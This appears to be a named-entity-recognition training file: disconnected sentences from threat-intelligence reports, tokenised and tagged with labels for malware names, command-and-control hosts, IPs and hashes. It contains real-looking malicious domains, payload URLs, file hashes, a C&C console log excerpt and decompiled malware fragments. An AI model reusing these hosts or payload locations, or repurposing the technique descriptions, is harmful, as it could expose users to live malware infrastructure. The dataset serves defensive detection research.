(	O
budget	O
estimation	O
request	O
)	O
(	O
Japan-US	O
dialogue	O
)	O
(	O
re-appointment	O
of	O
Prime	O
Minister	O
Abe	O
)	O
(	O
contact	O
network	O
)	O
(	O
staff	O
recruitment	O
plan	O
)	O
(	O
meeting	O
)	O
However	O
,	O
there	O
is	O
a	O
change	O
in	O
the	O
exploit	O
document	O
.	O

Excerpt	O
from	O
G.php	O
:	O

Also	O
included	O
in	O
this	O
toolset	O
is	O
a	O
script	O
that	O
decrypts	O
and	O
prints	O
the	O
contents	O
of	O
the	O
log	O
file	O
created	O
by	O
XtremeRAT	B-malware.backdoor
containing	O
victim	O
keystroke	O
data	O
.	O

The	O
backdoors	O
will	O
be	O
installed	O
and	O
executed	O
through	O
PowerShell	O
and	O
rundll32	O
.	O

The	O
second	O
domain	O
is	O
Iranian	O
,	O
allegedly	O
owned	O
by	O
a	O
web	O
design	O
company	O
named	O
Radcom	O
.	O

Figure	O
6	O
.	O

Risk	O
Analysis	O
:	O
Have	O
we	O
conducted	O
a	O
cybersecurity	O
risk	O
analysis	O
of	O
the	O
organization	O
?	O

The	O
fShutdown	O
flag	O
can	O
become	O
set	O
by	O
the	O
process	O
loading	O
the	O
server	O
variant	O
calling	O
the	O
DllRegisterServer	O
export	O
.	O

For	O
more	O
information	O
,	O
email	O
cyberadvisor@hq.dhs.gov	O
.	O

Mrxcls	O
(	O
Stuxnet	B-malware.backdoor
)	O

We	O
initially	O
discovered	O
the	O
malware	O
known	O
as	O
ANEL	B-malware.backdoor
back	O
in	O
November	O
2017	O
.	O

18	O
November	O
2015	O
.	O

1	O
*	O
/news/	O
feed.php	O
?	O

test	O
'	O
,	O
while	O
the	O
Indian	O
sample	O
uses	O
'	O
dns.com	B-url.normal
'	O
)	O
:	O
[	O
*	O
]	O
C	O
&	O
C	O
Running	O
on	O
0.0.0.0:443	B-url.cncsvr
[	O
+	O
]	O
New	O
client	O
connected	O
:	O
(	O
'	O
192.168.56.110	B-ip.unknown
'	O
,	O
1443	O
)	O
$	O
login	O
$	O
192.168.56.110	B-ip.unknown
MyUser	O
2013/06/07	O
02:18:35	O
Proxy	O
20130401	O
[	O
+	O
]	O
Authenticating	O
on	O
the	O
bot	O
OnLine	O
Pw_OK	O
When	O
the	O
authentication	O
is	O
confirmed	O
,	O
we	O
are	O
prompted	O
with	O
a	O
shell	O
through	O
which	O
we	O
can	O
interact	O
in	O
real-time	O
with	O
the	O
bot	O
.	O

Therefore	O
,	O
differences	O
between	O
the	O
available	O
sample	O
and	O
others	O
available	O
to	O
the	O
community	O
may	O
become	O
apparent	O
in	O
the	O
future	O
.	O

The	O
shellcode	O
in	O
turn	O
triggers	O
the	O
GhostScript	O
vulnerability	O
in	O
order	O
to	O
execute	O
an	O
embedded	O
DLL	O
that	O
has	O
also	O
been	O
XORed	O
.	O

However	O
,	O
besides	O
the	O
CSEC	O
document	O
there	O
was	O
no	O
obvious	O
pointer	O
found	O
leading	O
to	O
the	O
conclusion	O
that	O
Babar	B-malware.drop
and	O
its	O
companions	O
were	O
set	O
out	O
by	O
French	O
inteligence	O
services	O
.	O

URL	O
:	O
hxxp://support(.)chatconnecting.com/2nx7m	B-url.unknown
2017-01-20	O
10:11:47	O

Dino	B-malware.backdoor
has	O
been	O
developed	O
in	O
C++	O
and	O
presents	O
a	O
well­defined	O
modular	O
architecture	O
.	O

360.homeunix.com	B-url.unknown
69.164.192.4	B-ip.unknown
alt1.homelinux.com	B-url.unknown
amt1.homelinux.com	B-url.unknown
aop1.homelinux.com	B-url.unknown
app1.homelinux.com	B-url.unknown
blogspot.blogsite.org	B-url.unknown
filoups.info	B-url.unknown
ftp2.homeunix.com	B-url.unknown
ftpaccess.cc	B-url.unknown
google.homeunix.com	B-url.unknown
members.linode.com	B-url.unknown
sl1.homelinux.org	O
sl1.homelinux.org	B-url.unknown
tyuqwer.dyndns.org	B-url.unknown
update.ourhobby.com	B-url.unknown
voanews.ath.cx	B-url.unknown
webswan.33iqst.com:4000	B-url.unknown
yahoo.8866.org	B-url.unknown
ymail.ath.cx	B-url.unknown
yahooo.8866.org	B-url.unknown
sl1.homelinux.org	B-url.unknown
360.homeunix.com	B-url.unknown
ftp2.homeunix.com	B-url.unknown
update.ourhobby.com	B-url.unknown
connectproxy.3322.org	B-url.unknown
csport.2288.org	B-url.unknown

In	O
this	O
heist	O
the	O
attackers	O
created	O
messages	O
to	O
transfer	O
funds	O
to	O
Cambodia	O
,	O
the	O
US	O
,	O
and	O
Sri	O
Lanka	O
.	O

Additionally	O
,	O
it	O
provides	O
examination	O
of	O
a	O
FinSpy	B-malware.backdoor
Mobile	I-malware.backdoor
sample	O
found	O
in	O
the	O
wild	O
,	O
which	O
appears	O
to	O
have	O
been	O
used	O
in	O
Vietnam	O
.	O

Key	O
=	O
$	O
key	O
$	O
prov.IV	O
=	O
$	O
iv	O
$	O
decr	O
=	O
$	O
prov.CreateDecryptor	O
(	O
$	O
prov	O
.	O

[	O
Online	O
]	O
http://www.haaretz.com/blogs/diplomania/israel-s-foreign-ministry-targeted-by-computer-virus-bearing-idf-chief-s-name.premium-1.472278	B-url.normal
.	O

It	O
fakes	O
and	O
overrides	O
the	O
array	O
object	O
to	O
perform	O
arbitrary	O
address	O
reading	O
and	O
writing	O
.	O

If	O
the	O
dropper	O
is	O
executed	O
with	O
administrator	O
privileges	O
,	O
then	O
it	O
tries	O
to	O
write	O
the	O
following	O
files	O
in	O

For	O
starters	O
,	O
it	O
employs	O
several	O
'	O
hide	O
in	O
plain	O
sight	O
'	O
techniques	O
common	O
to	O
malware	O
used	O
in	O
targeted	O
attacks	O
.	O

b85c17f92629fec41502b44cf86ba859	B-hash
6f08808d0be510698563d3b0443fe5a4	B-hash
b8c6c8eeb9a18b1d4632bc8191db5517	B-hash
ddff0a7643f4ff2fe777e768e7bae004	B-hash
2395c798ca8628e735ac2d8d274cd230	B-hash
bc6baf7a1d420d226a7a157b412a51d9	B-hash
8ba38899a6446366724d98761dd10d46	B-hash
d538e50df25e30f3c4252ce523507d23	B-hash
a50da199db97abb2dfd6fd62b5a00f02	B-hash
2a1884bdab940ea66b28599245e79fa9	B-hash
2f30034885045bae4a201bf6b3913b54	B-hash
23c3f3e93ea2ffe704abb602d04588c0	B-hash
b8c6c8eeb9a18b1d4632bc8191db5517	B-hash
e5500274853f77be6ffba610dac2cae4	B-hash
ffa1bdc105013e1cbb00483b412b98b8	B-hash
0264076c190af6e1176e1abff47d1ae8	B-hash
02ef03bd5e6dbf9c03e8504c9e797abd	B-hash
Name	O
D	O
:	O
\IL\Working	O
Tools\2016-04-23	O
NeD	O
Ver	O
9	O
Ran	O
Il	O
-	O
192.52.167.118\NeD	O
Download	O
and	O
execute	O
Version	O
1	O
-	O
Doc\bin\Release\Obfuscated\News.pdb	O
http://bit[.]ly/1YRoIPX	B-url.unknown
http://smail.otzo[.]com/W/Gfsdfsdfsrydkfpsdmfpsadsdfsdf	B-url.unknown
sdfsdfdfsp.php	I-url.unknown
http://smail.otzo[.]com/y/analysis--hezbollah.rar	B-url.unknown
https://drive.google[.]com/uc?export=download&amp;id=	B-url.unknown
0B7XzN8DNbJKiQlFNRHdVTmpCd0U	I-url.unknown
https://drive.google[.]com/uc?export=download&id=0Bxa	B-url.unknown
UrWGCqlWLMTQzMVFNOENIUFk	I-url.unknown
drops	O
ad5531b085ef005ee12319e88fb8f674	B-hash
Updata.exe	O

Protect	O
Against	O
SQL	O
Injection	O
and	O
Other	O
Attacks	O
on	O
Web	O
Services	O

10006148	O
60	O
09	O
67	O
09	O
66	O
09	O
6A	O
09	O
67	O
09	O
68	O
09	O
7D	O
09	O
60	O
09	O
'	O
.g.f.j.g.h.	O
}	O
.	O
'	O
.	O

So	O
,	O
it	O
will	O
bring	O
great	O
difficulties	O
to	O
the	O
forensic	O
work	O
.	O

One	O
alternative	O
theory	O
regarding	O
the	O
use	O
of	O
the	O
Russian	O
language	O
in	O
the	O
application	O
could	O
be	O
that	O
targeting	O
may	O
have	O
been	O
directed	O
at	O
pro-Russian	O

In	O
the	O
beginning	O
of	O
December	O
2015	O
,	O
three	O
samples	O
were	O
submitted	O
to	O
online	O
malware	O
detection	O
and	O
analysis	O
platforms	O
malwr.com	B-url.normal
and	O
Virus	O
Total	O
.	O

To	O
be	O
able	O
to	O
decipher	O
the	O
data	O
,	O
the	O
attacker	O
should	O
certainly	O
know	O
either	O
the	O
MD5	O
hash	O
or	O
the	O
whole	O
buffer	O
content	O
.	O

To	O
find	O
the	O
ASPX	O
shell	O
,	O
modify	O
the	O
regex	O
to	O
fit	O
the	O
syntax	O
of	O
the	O
ASPX	O
shell	O
as	O
shown	O
:	O
Researchers	O
unsure	O
where	O
all	O
of	O
the	O
PHP	O
or	O
ASPX	O
files	O
are	O
on	O
a	O
Windows	O
host	O
can	O
use	O
the	O
dir	O
command	O
with	O
some	O
extended	O
options	O
to	O
help	O
identify	O
Web	O
files	O
to	O
run	O
the	O
regex	O
command	O
against	O
(	O
see	O
Figure	O
28	O
)	O
.	O

It	O
is	O
'	O
checkupdate	O
(	O
)	O
'	O
and	O
it	O
seems	O
that	O
the	O
malware	O
is	O
instructed	O
to	O
contact	O
periodically	O
the	O
C	O
&	O
C	O
waiting	O
for	O
new	O
commands	O
.	O

After	O
receiving	O
its	O
SESSIONID	O
,	O
the	O
backdoor	O
does	O
a	O
fingerprint	O
of	O
the	O
system	O
.	O

After	O
spreading	O
the	O
malware	O
,	O
more	O
Android	O
smartphones	O
has	O
been	O
infected	O
using	O
the	O
same	O
technique	O
(	O
via	O
Telegram	O
)	O
and	O
then	O
repost	O
the	O
malware	O
again	O
and	O
again	O
making	O
a	O
network	O
of	O
victims	O
.	O

Notice	O
that	O
these	O
numbers	O
vary	O
based	O
on	O
the	O
dataset	O
.	O

In	O
the	O
course	O
of	O
that	O
campaign	O
,	O
APT29	B-malware.backdoor
successfully	O
compromised	O
a	O
U.S.	O
political	O
party	O
.	O

This	O
configuration	O
is	O
located	O
in	O
the	O
following	O
directory	O
on	O
the	O
victim	O
device	O
:	O

It	O
is	O
likely	O
that	O
it	O
was	O
downloaded	O
onto	O
the	O
victim	O
's	O
computer	O
after	O
receiving	O
an	O
instruction	O
by	O
the	O
C	O
&	O
C	O
servers	O
.	O

This	O
post	O
contains	O
analysis	O
of	O
several	O
pieces	O
of	O
malware	O
obtained	O
by	O
Vernon	O
Silver	O
of	O
Bloomberg	O
News	O
that	O
were	O
sent	O
to	O
Bahraini	O
pro-democracy	O
activists	O
in	O
April	O
and	O
May	O
of	O
this	O
year	O
.	O

תדחוימ	O
הדיחי	O
special	O
forces	O
unit	O

'	O
IDF	O
NEWS	O
[	O
RTLO	O
]	O
cod.SCR	O
'	O

After	O
alerting	O
the	O
attackers	O
they	O
have	O
been	O
discovered	O
,	O
the	O
dropper	O
will	O
try	O
to	O
delete	O
the	O
temporary	O
files	O
created	O
by	O
him	O
and	O
terminate	O
activity	O
of	O
the	O
infection	O
process	O
.	O

The	O
internet	O
communication	O
module	O
of	O
Babar	B-malware.drop
is	O
located	O
in	O
a	O
sparate	O
export	O
called	O
'	O
FindCtxSectionStringW	O
'	O
,	O
which	O
will	O
be	O
invoked	O
through	O
remote	O
thread	O
injection	O
at	O
runtime	O
.	O

More	O
precisely	O
,	O
when	O
a	O
modification	O
is	O
made	O
to	O
a	O
module	O
's	O
content	O
in	O
memory	O
,	O
the	O
PSM	O
module	O
saves	O
it	O
as	O
a	O
serialized	O
DataStore	O
.	O

It	O
's	O
interesting	O
that	O
one	O
sample	O
of	O
the	O
directory	O
listing	O
collector	O
was	O
infected	O
with	O
the	O
infamous	O
'	O
Viking	B-malware.drop
'	O
virus	O
of	O
Chinese	O
origin	O
.	O

The	O
reason	O
for	O
the	O
shift	O
is	O
unknown	O
.	O

Separate	O
administrators	O
into	O
privilege	O
tiers	O
with	O
limited	O
access	O
to	O
other	O
tiers	O
.	O

A	O
copy	O
has	O
been	O
sent	O
to	O
cso_	O
[	O
removed_by_analyst	O
].com	O
and	O
investigation@policeheadquater[.]com	O
Police	O
Investigation	O
Department	O
--	O
-	O
Disclaimer	O
--	O
-	O
The	O
information	O
in	O
this	O
mail	O
is	O
confidential	O
and	O
is	O
intended	O
solely	O
for	O
addressee	O
.	O

Many	O
thanks	O
to	O
the	O
team	O
for	O
working	O
with	O
The	O
exploit	O
uses	O
a	O
Microsoft	O
Office	O
document	O
to	O
download	O
and	O
execute	O
an	O
Adobe	B-malware.drop
Flash	I-malware.drop
exploit	O
to	O
victim	O
computers	O
.	O

X-Agent	B-malware.backdoor
is	O
a	O
persistent	O
payload	O
injected	O
into	O
the	O
victim	O
machine	O
that	O
can	O
be	O
compiled	O
for	O
almost	O
any	O
Operating	O
System	O
and	O
can	O
be	O
enhanced	O
by	O
adding	O
new	O
ad-hoc	O
component	O
developed	O
for	O
the	O
specific	O
cyber-attack	O
.	O

Domains	O
:	O

The	O
functionality	O
remains	O
the	O
same	O
:	O
it	O
is	O
a	O
standard	O
backdoor	O
that	O
uses	O
the	O
Telegram	O
Bot	O
API	O
in	O
order	O
to	O
receive	O
commands	O
from	O
,	O
and	O
send	O
responses	O
to	O
,	O
the	O
malware	O
operator	O
.	O

http://researchcenter.paloaltonetworks.com/2014/09/recent-watering-hole-attacks-attributed-apt-group-th3bug-using-poison-ivy/	B-url.normal

Table	O
1	O
:	O
Commands	O
used	O
by	O
Asruex	B-malware.drop
Collect	O
information	O
of	O
infected	O
hosts	O
Obtain	O
process	O
list	O
Obtain	O
file	O
list	O
Change	O
waiting	O
time	O
Obtain	O
version	O
information	O
Uninstall	O
Obtain	O
folder	O
list	O
Load	O
DLL	O
Execute	O
external	O
DLL	O
(	O
AdvProv.dll	O
)	O
AdvProv.dll	O
is	O
encrypted	O
using	O
XOR	O
and	O
3DES	O
.	O

Search	O
historic	O
and	O
future	O
emails	O
that	O
match	O
the	O
included	O
indicators	O
of	O
compromise	O
.	O

DecryptResource_sub_49D9EC	O
(	O
)	O
.	O

Like	O
the	O
Trojan	O
from	O
the	O
first	O
campaign	O
,	O
this	O
sample	O
is	O
executed	O
through	O
search-order	O
hijacking	O
.	O

After	O
the	O
capture	O
of	O
the	O
new	O
activity	O
,	O
we	O
contacted	O
Microsoft	O
immediately	O
and	O
shared	O
detailed	O
information	O
with	O
them	O
.	O

HKCU	O
\Software\Microsoft\Windows\	O
CurrentVersion\Run\'dllhost	O
'	O
=	O
%	O
Temp%\WmiPrvSer.exe	O

The	O
file	O
had	O
been	O
identified	O
only	O
once	O
:	O
it	O
had	O
been	O
sent	O
for	O
scanning	O
to	O
VirusTotal	O
from	O
China	O
in	O
May	O
2011	O
.	O

See	O
below	O
for	O
more	O
information	O
about	O
them	O
.	O

Even	O
after	O
encoding	O
every	O
single	O
string	O
related	O
to	O
malicious	O
code	O
,	O
the	O
DUBNIUM	B-malware.drop
malware	O
goes	O
one	O
more	O
step	O
to	O
hide	O
its	O
internal	O
operations	O
.	O

Cleaning	O
and	O
Repair	O

Created	O
by	O
'	O
ahmed	O
'	O
,	O
saved	O
by	O
'	O
aert	O
'	O
word.doc	O
:	O
IDF	O
NEWS.doc	O
:	O
Created	O
and	O
saved	O
by	O
'	O
aert	O
'	O
Brotherhood.doc	O
:	O
Created	O
and	O
saved	O
by	O
'	O
aert	O
'	O
Created	O
and	O
saved	O
by	O
'	O
aert	O
'	O
detl.doc	O
:	O
Created	O
and	O
saved	O
by	O
'	O
HinT	O
'	O
Advisor.doc	O
:	O
IDF.doc	O
:	O
Created	O
and	O
saved	O
by	O
'	O
aert	O
'	O
Created	O
and	O
saved	O
by	O
'	O
HinT	O
'	O
System.doc	O
:	O
Created	O
and	O
saved	O
by	O
'	O
HinT	O
'	O
York.doc	O
:	O
barrage.doc	O
:	O
Created	O
and	O
saved	O
by	O
'	O
HinT	O
'	O
shehab.doc	O
:	O
Created	O
and	O
saved	O
by	O
'	O
HinT	O
'	O

Some	O
droppers	O
for	O
the	O
IRONGATE	B-malware.backdoor
malware	O
would	O
not	O
run	O
if	O
VMware	O
or	O
Cuckoo	O
Sandbox	O
environments	O
were	O
employed	O
.	O

Another	O
variant	O
of	O
this	O
backdoor	O
uses	O
the	O
same	O
winsocks.exe	B-malware.backdoor
with	O
a	O
different	O
dropping	O
mechanism	O
and	O
was	O
found	O
at	O
http[:]//199.91.173[.]43/Classified_Video.flv.scr	B-ip.unknown
and	O
http[:]//199.91.173[.]43/sarbajit_leaked_video.wmv.scr	B-ip.unknown
.	O

If	O
it	O
is	O
,	O
the	O
botnet	O
connection	O
I/O	O
procedure	O
is	O
called	O
through	O
the	O
MainConnectionIo	O
function	O
.	O

One	O
of	O
method	O
uses	O
a	O
very	O
interesting	O
technique	O
of	O
payload	O
execution	O
which	O
is	O
designed	O
mostly	O
to	O
bypass	O
modern	O
anti-malware	O
products	O
.	O

The	O
group	O
hit	O
organizations	O
in	O
Israel	O
,	O
Jordan	O
,	O
the	O
United	O
Arab	O
Emirates	O
,	O
Saudi	O
Arabia	O
,	O
and	O
Turkey	O
.	O

The	O
technical	O
information	O
is	O
being	O
delivered	O
to	O
you	O
as	O
is	O
and	O
Symantec	O
Corporation	O
makes	O
no	O
warranty	O
as	O
to	O
its	O
accuracy	O
or	O
use	O
.	O

Besides	O
the	O
project	O
name	O
,	O
Babar64	B-malware.drop
also	O
shares	O
the	O
malformed	O
user	O
agent	O
string	O
described	O
in	O
the	O
document	O
,	O
where	O
a	O
letter	O
from	O
the	O
MSIE	O
6.0	O
name	O
is	O
missing	O
.	O

In	O
a	O
slight	O
change	O
to	O
the	O
previous	O
variant	O
,	O
the	O
new	O
payloads	O
are	O
executed	O
with	O
a	O
Windows	O
Scheduled	O
Task	O
.	O

Word	O
document	O
(	O
see	O
Exhibit	O
1	O
)	O
with	O
the	O
following	O
properties	O
:	O
:	O
f12fc711529b48bcef52c5ca0a52335a	B-hash
:	O
mary	O
:	O
mary	O
:	O
2018:01:19	O
14:56:00	O
(	O
Jan	O
.	O

Figure	O
14	O
.	O

Sometimes	O
the	O
contractors	O
would	O
compete	O
with	O
each	O
other	O
,	O
sometimes	O
they	O
would	O
work	O
together	O
,	O
but	O
payment	O
was	O
only	O
made	O
once	O
the	O
objective	O
was	O
completed	O
.	O

Only	O
the	O
best	O
teams	O
succeed	O
,	O
are	O
paid	O
,	O
and	O
remain	O
in	O
business	O
.	O

The	O
jmidebs	O
and	O
Duqu	B-malware.infosteal
drivers	O
use	O
stubs	O
with	O
a	O
total	O
size	O
of	O
7061	O
bytes	O
.	O

http://-	O
If	O
this	O
appears	O
in	O
unlabeled	O
textbox1	O
,	O
download	O
content	O
from	O
the	O
assumed	O
URL	O
.	O

The	O
backdoor	O
is	O
also	O
capable	O
of	O
elevating	O
its	O
privileges	O
on	O
win7	O
and	O
above	O
using	O
a	O
method	O
similar	O
to	O
the	O
one	O
described	O
here	O
:	O
http://www.pretentiousname.com/misc/win7_uac_whitelist2.html	B-url.unknown
.	O

Fidelis	O
researchers	O
have	O
developed	O
a	O
set	O
of	O
rules	O
for	O
detecting	O
the	O
Shamoon	B-malware.unknown
malware	O
along	O
the	O
entire	O
threat	O
life	O
cycle	O
:	O
initial	O
infection	O
,	O
lateral	O
propagation	O
,	O
and	O
command	O
and	O
control	O
communication	O
.	O

Combining	O
unmatched	O
experience	O
and	O
specialized	O
skills	O
across	O
more	O
than	O
40	O
industries	O
and	O
all	O
business	O
functions	O
—	O
underpinned	O
by	O
the	O
world	O
's	O
largest	O
delivery	O
network—	O
Accenture	O
works	O
at	O
the	O
intersection	O
of	O
business	O
and	O
technology	O
to	O
help	O
clients	O
improve	O
their	O
performance	O
and	O
create	O
sustainable	O
value	O
for	O
their	O
stakeholders	O
.	O

C	O
&	O
C	O
:	O

designates	O
a	O
volume	O
serial	O
number	O
collect	O
data	O
harvested	O
from	O
a	O
targeted	O
system	O
designates	O
a	O
volume	O
serial	O
number	O
infect	O
this	O
particular	O
drive	O
designates	O
any	O
connected	O
volume	O
not	O
listed	O
above	O
retrieve	O
a	O
directory	O
listing	O
from	O
the	O
just	O
connected	O
drive	O
,	O
re	O
:	O
00	O

Aikapool[.]com	O
is	O
a	O
public	O
mining	O
pool	O
and	O
port	O
7915	O
is	O
used	O
for	O
DogeCoin	O
:	O
The	O
username	O
(	O
myapp2150	O
)	O
was	O
used	O
to	O
register	O
accounts	O
in	O
several	O
forums	O
and	O
on	O
Reddit	O
.	O

3DA8C22F5340850EE5A2C25B1D17FC27	B-hash
loading.myftp.org	B-url.cncsvr

Figure	O
3	O
.	O

While	O
Freegate	B-malware.infosteal
was	O
erroneously	O
labelled	O
a	O
Trojan	B-malware.backdoor
by	O
one	O
anti-virus	O
company	O
nearly	O
a	O
decade	O
ago	O
,	O
in	O
this	O
attack	O
,	O
attackers	O
packaged	O
what	O
appears	O
to	O
be	O
a	O
legitimate	O
version	O
of	O
Freegate	B-malware.infosteal
with	O
a	O
malicious	O
implant	O
.	O

First	O
Seen	O
:	O
Dropper	O
Filename	O
:	O

jdk-7u12-windows-i586.java-se.com	O
on	O
the	O
Japanese	O
IP	O
address	O
210.253.96.200.7506	B-ip.unknown
|	O
210.253.96.0/20	B-ip.unknown
|	O
INTERQ	O
|	O
JP	O
|	O
GMO.JP	O
|	O
GMO	O
INTERNET	O
INC	O
.	O

PCC_FILE::ProcessPacketEx.PCC_FILE::ProcessPacketEx	O
performs	O
no	O
file	O
management	O
operations	O
but	O
instead	O
adds	O
any	O
incoming	O
command	O
packets	O
to	O
a	O
queue	O
for	O
processing	O
by	O
PCC_FILE	O
:	O
:ReadWaitingData	O
if	O
the	O
packet	O
is	O
not	O
already	O
within	O
the	O
queue	O
(	O
thus	O
avoiding	O
duplication	O
of	O
commands	O
)	O
.	O

I	O
attained	O
full	O
functionality	O
using	O
the	O
Gh0st	B-malware.backdoor
3.6	O
protocol	O
in	O
the	O
controller	O
,	O
despite	O
the	O
fact	O
that	O
the	O
incoming	O
structure	O
was	O
not	O
exactly	O
what	O
my	O
customized	O
controller	O
expected	O
.	O

CTUTM	O
researchers	O
assess	O
with	O
moderate	O
confidence	O
that	O
the	O
group	O
is	O
operating	O
from	O
the	O
Russian	O
Federation	O
and	O
is	O
gathering	O
intelligence	O
on	O
behalf	O
of	O
the	O
Russian	O
government	O
.	O

The	O
dropped	O
file	O
is	O
then	O
executed	O
as	O
shown	O
in	O
the	O
below	O
screen	O
shot	O
.	O

An	O
attack	O
using	O
a	O
malicious	O
installer	O
of	O
a	O
working	O
and	O
reputable	O
security	O
or	O
proxy	O
tool	O
is	O
especially	O
pernicious	O
as	O
it	O
targets	O
users	O
who	O
likely	O
recognize	O
the	O
importance	O
of	O
privacy	O
and	O
circumvention	O
,	O
and	O
may	O
believe	O
that	O
they	O
have	O
increased	O
their	O
privacy	O
and	O
security	O
by	O
installing	O
the	O
tool	O
.	O

'	O
Referer	O
:	O
'	O
;	O
http_header	O
;	O
http_method	O
;	O
content	O
:	O
!	O

The	O
list	O
is	O
extensive	O
and	O
includes	O
major	O
organizations	O
and	O
smaller	O
entities	O
alike	O
.	O

Summary	O
:	O
WhiteBear	O
is	O
a	O
cluster	O
of	O
activity	O
targeting	O
foreign	O
embassies	O
and	O
MFA	O
organizations	O
,	O
starting	O
in	O
early	O
2016	O
and	O
continued	O
into	O
early	O
2017	O
.	O

This	O
document	O
provides	O
technical	O
details	O
regarding	O
the	O
tools	O
and	O
infrastructure	O
used	O
by	O
the	O
Russian	O
civilian	O
and	O
military	O
intelligence	O
Services	O
(	O
RIS	O
)	O
to	O
compromise	O
and	O
exploit	O
networks	O
and	O
endpoints	O
associated	O
with	O
the	O
U.S.	O
election	O
,	O
as	O
well	O
as	O
a	O
range	O
of	O
U.S.	O
Government	O
,	O
political	O
,	O
and	O
private	O
sector	O
entities	O
.	O

For	O
horizons-tourisme.com	B-url.normal
:	O

71a52058f6b5cef66302c19169f67cf304507b4454cca83e2c36151da8da1d97	B-hash

In	O
both	O
cases	O
,	O
the	O
key	O
is	O
Unicode	O
.	O

2017년에는	O
공격	O
성공	O
가능성을	O
극대화하기	O
위해	O
PC방	O
관리	O
프로그램을	O
이용해	O
다수의	O
컴퓨터에	O
악성코드를	O
유포했다	O
.	O

It	O
seems	O
highly	O
unlikely	O
that	O
this	O
was	O
the	O
only	O
project	O
that	O
its	O
authors	O
were	O
involved	O
in	O
.	O

The	O
quickest	O
and	O
easiest	O
method	O
,	O
especially	O
on	O
a	O
Linux	O
machine	O
,	O
is	O
probably	O
using	O
regular	O
expressions	O
.	O

re	O
sult	O
=	O
0	O
;	O
dwType	O
=	O
4	O
;	O
cbData	O
=	O
4	O
;	O
str_AppID	O
=	O
decrypt_string	O
(	O
&	O
enc_AppID	O
)	O
;	O
(	O
(	O
RegQueryValueExA	O
(	O
hKey	O
,	O
str_AppID	O
,	O
0	O
,	O
&	O
dwType	O
,	O
&	O
result	O
,	O
&	O
cbData	O
)	O
|	O
|	O
dwType	O
!	O
=	O
&	O
&	O
(	O
dwType	O
=	O
4	O
,	O
result	O
=	O
get_tickcount_based_value	O
(	O
)	O
,	O
RegSetValueExA	O
(	O
hKey	O
,	O
str_AppID	O
,	O
0	O
,	O
dwType	O
,	O
&	O
result	O
,	O
4u	O
)	O
)	O
)	O

While	O
we	O
do	O
n't	O
have	O
visibility	O
into	O
Israeli	O
government	O
mails	O
,	O
we	O
do	O
receive	O
a	O
lot	O
of	O
suspicious	O
executable	O
files	O
,	O
and	O
a	O
little	O
digging	O
gives	O
results	O
.	O

Funnily	O
enough	O
,	O
the	O
key	O
serving	O
to	O
encrypt	O
the	O
file	O
on	O
disk	O
is	O
'	O
PsmIsANiceM0du1eWith0SugarInside	O
'	O
.	O

Figure	O
7	O
.	O

Babar	B-malware.drop
does	O
show	O
the	O
same	O
obscure	O
treatment	O
for	O
installed	O
anti-virus	O
products	O
as	O
the	O
Bunny	B-malware.unknown
malware	O
though	O
.	O

Bot	O
:	O

The	O
call	O
graph	O
for	O
this	O
functionality	O
is	O
shown	O
in	O
Figure	O
16	O
.	O

[	O
그림	O
16	O
]	O
Anonymous	B-malware.unknown
검사	O
코드	O

3f288dfa95d90a3cb4503dc5f3d49c16	B-hash
Server	O
Cometa4	O

Security	O
researchers	O
have	O
often	O
made	O
the	O
mistake	O
of	O
assuming	O
that	O
when	O
a	O
specific	O
tool	O
was	O
observed	O
being	O
used	O
in	O
espionage	O
attacks	O
,	O
it	O
was	O
representative	O
of	O
activity	O
of	O
a	O
single	O
actor	O
.	O

The	O
following	O
detections	O
are	O
in	O
place	O
today	O
:	O

We	O
suspect	O
this	O
router	O
was	O
hacked	O
as	O
part	O
of	O
the	O
campaign	O
in	O
order	O
to	O
process	O
the	O
malware	O
's	O
HT	O
T	O
P	O
requests	O
.	O

Other	O
open	O
source	O
and	O
semi-legitimate	O
pen-testing	O
tools	O
like	O
nbtscan	O
and	O
powercat	O
are	O
being	O
used	O
for	O
mapping	O
available	O
resources	O
and	O
lateral	O
movement	O
as	O
well	O
.	O

In	O
addition	O
,	O
there	O
are	O
other	O
issues	O
,	O
mostly	O
to	O
do	O
with	O
the	O
creation	O
of	O
the	O
Trojan	O
,	O
or	O
rather	O
the	O
platform	O
used	O
to	O
implement	O
Duqu	B-malware.infosteal
as	O
well	O
as	O
Stuxnet	B-malware.backdoor
.	O

APT-C-06	O
组织在全球范围内首例使	O

large	O
file	O
sizes	O
,	O
and	O
password-protected	O
documents	O
–	O
each	O
of	O
which	O
are	O
described	O
in	O
the	O
sections	O
below	O
.	O

The	O
attack	O
we	O
analyzed	O
is	O
multi-stage	O
,	O
an	O
initial	B-malware.drop
dropper	O
malware	O
written	O
in	O
Delphi	O
programming	O
language	O
(	O
a	O
language	O
used	O
by	O
the	O
APT28	O
in	O
other	O
campaigns	O
)	O
downloads	O
a	O
second	O
stage	O
payload	O
from	O
internet	O
and	O
executes	O
it	O
.	O

A	O
report	O
written	O
by	O
the	O
Swiss	O
federal	O
police	O
,	O
which	O
investigated	O
the	O
origin	O
of	O
several	O
of	O
the	O
spearphishing	O
emails	O
sent	O
to	O
Ablyazov	O
's	O
family	O
and	O
associates	O
,	O
concluded	O
that	O
the	O
emails	O
were	O
sent	O
from	O
IP	O
addresses	O
in	O
India	O
.	O

ATTRIBUTION	O

In	O
English	O
,	O
chinch	O
is	O
the	O
word	O
for	O
a	O
small	O
North	O
American	O
bug	O
,	O
Blissus	O
leucopterus	O
.	O

The	O
VBS	O
code	O
in	O
this	O
file	O
(	O
Figure	O
10	O
)	O
has	O
the	O
ability	O
to	O
recreate	O
the	O
whole	O
chain	O
and	O
download	O
the	O
same	O
ZIP	O
archive	O
.	O

And	O
around	O
the	O
same	O
time	O
,	O
another	O
'	O
certified	O
distributor	O
'	O
winrar[.]it	B-url.normal
served	O
trojanized	O
installers	O
as	O
well	O
.	O

The	O
messages	O
we	O
previously	O
identified	O
represent	O
the	O
actual	O
commands	O
that	O
can	O
be	O
sent	O
to	O
the	O
bot	O
:	O

Source	O

The	O
IP	O
addresses	O
corresponded	O
to	O
a	O
mix	O
of	O
public	O
and	O
private	O
financial	O
institutions	O
spread	O
across	O
the	O
globe	O
:	O
However	O
,	O
banks	O
in	O
some	O
specific	O
countries	O
feature	O
prominently	O
in	O
the	O
list	O
:	O
Rank	O
Country	O
Poland	O
Count	O
United	O
States	O
Mexico	O
United	O
Kingdom	O
7	O
Chile	O
Brazil	O
Peru	O
Colombia	O
Denmark	O
India	O
The	O
prominence	O
of	O
Polish	O
and	O
Mexican	O
banks	O
matches	O
the	O
observation	O
of	O
watering-hole	O
code	O
on	O
sites	O
in	O
both	O
countries	O
.	O

ATTACK	O
GROUPS	O
SEND	O
MALWARE	O
,	O
